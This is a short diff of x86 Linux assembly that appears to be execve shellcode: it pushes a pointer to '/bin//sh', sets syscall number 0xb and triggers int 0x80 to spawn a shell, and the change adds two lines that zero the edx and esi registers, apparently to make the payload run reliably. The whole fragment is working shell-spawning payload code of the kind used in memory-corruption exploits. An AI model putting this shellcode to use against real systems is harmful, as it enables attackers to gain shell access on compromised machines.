@@ -11,6 +11,8 @@ _start:
    mov ebx, esp     ; get ptr to /bin//sh
    push eax         ; optional
    push ebx         ; optional
+   xor edx, edx
+   xor esi, esi
    mov ecx, esp     ; if both removed, then need to xor this
    mov al, 0xb
    int 0x80
